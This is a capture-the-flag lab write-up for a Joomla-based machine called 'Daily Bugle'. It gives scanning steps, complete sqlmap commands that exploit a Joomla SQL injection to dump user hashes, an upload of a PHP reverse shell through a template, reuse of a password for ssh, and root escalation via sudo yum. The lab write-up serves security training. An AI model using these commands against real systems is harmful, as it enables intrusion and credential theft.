# Daily Bugle

### Deploy

**Who robbed the bank?**

Navigate to the ip address and find the culprit.

### Obtain user and root

Scan with [nmap](./daily-bugle.nmap), found open ports:

- 22 ssh
- 80 http
- 3306 mysql

Enumerate with [gobuster](./daily-bugle.gobuster), found directories:

- /images
- /media
- /templates
- /modules
- /bin
- /plugins
- /includes
- /language
- /components
- /cache
- /libraries
- /tmp
- /layouts
- /administrator
- /cli

Found the Joomla CMS portal at /administrator

**What is the Joommla version?**

Use [CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) to find Joomla version

**What is the cracked password?**

Find [Joomla exploit](https://www.exploit-db.com/exploits/42033) on exploit db

Test SQLi

`http://<TARGET-IP>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=<SQL-QUERY>`

Use sqli to dump db (--level=5 important, takes a while and can be flaky)

Map:

`sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`

Dump users:

`sqlmap -u "http://&ltremote-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump`

Crack hashed password from dumped db

Log in to CMS with credentials from db

**What is the user flag**

Upload php reverse shell through protostar templates and execute with:

`http://<TARGET-IP>/templates/protostar/shell.php`

Find mysql password in configuration file and try ssh log in with user name and mysql 
password

Use cat to read user.txt

**What is the root flag**

Check user privileges with `sudo -l` and privesc with yum

Use cat to read root.txt
